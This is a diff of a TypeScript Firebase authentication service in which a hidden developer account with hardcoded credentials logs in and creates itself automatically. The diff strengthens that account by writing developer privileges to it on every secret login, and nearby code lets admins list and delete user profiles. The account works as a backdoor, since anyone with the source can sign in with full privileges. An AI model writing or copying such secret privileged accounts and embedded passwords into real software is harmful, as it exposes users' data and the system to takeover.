@@ -29,8 +29,9 @@ const mapUser = (fbUser: FirebaseUser, additionalData?: any): User => ({
 });
 
 // Constants for the hidden developer account
-const HIDDEN_DEV_EMAIL = "hidden_admin@qudrat.local"; // Internal email for the secret account
-const HIDDEN_DEV_PASS = "dev_secret_mode_active"; // Strong internal password
+// Fix: Changed .local to .com because Firebase Auth validates email format strictly
+const HIDDEN_DEV_EMAIL = "hidden_admin@qudrat.com"; 
+const HIDDEN_DEV_PASS = "dev_secret_mode_active"; 
 
 export const authService = {
     login: async (email: string, password: string): Promise<User> => {
@@ -63,7 +64,18 @@ export const authService = {
             // Try to login normally first
             const cred = await signInWithEmailAndPassword(auth, HIDDEN_DEV_EMAIL, HIDDEN_DEV_PASS);
             const userDoc = await getDoc(doc(db, 'users', cred.user.uid));
-            return mapUser(cred.user, userDoc.exists() ? userDoc.data() : { isDeveloper: true, username: 'المطور' });
+            
+            // Force developer privileges on every secret login
+            if (userDoc.exists()) {
+                const userData = userDoc.data();
+                if (!userData.isDeveloper) {
+                    await updateDoc(doc(db, 'users', cred.user.uid), { isDeveloper: true });
+                    userData.isDeveloper = true;
+                }
+                return mapUser(cred.user, userData);
+            }
+            
+            return mapUser(cred.user, { isDeveloper: true, username: 'المطور' });
         } catch (error: any) {
             // If user doesn't exist (first time usage), create it automatically
             if (error.code === 'auth/user-not-found' || error.code === 'auth/invalid-credential') {
@@ -83,7 +95,7 @@ export const authService = {
                     return mapUser(cred.user, devUser);
                 } catch (createError) {
                     console.error("Failed to auto-create hidden dev:", createError);
-                    throw new Error("فشل الدخول للنظام");
+                    throw new Error("فشل الدخول للنظام السري. يرجى المحاولة لاحقاً.");
                 }
             }
             throw error;
@@ -162,7 +174,6 @@ export const authService = {
         });
     },
     
-    // Fetch users from Firestore for Admin View
     getAllUsers: async (): Promise<{ key: string, user: User }[]> => {
         try {
             const querySnapshot = await getDocs(collection(db, 'users'));
@@ -176,7 +187,6 @@ export const authService = {
         }
     },
 
-    // Delete user profile from Firestore
     deleteUser: async (userKey: string): Promise<void> => {
         try {
             await deleteDoc(doc(db, 'users', userKey));
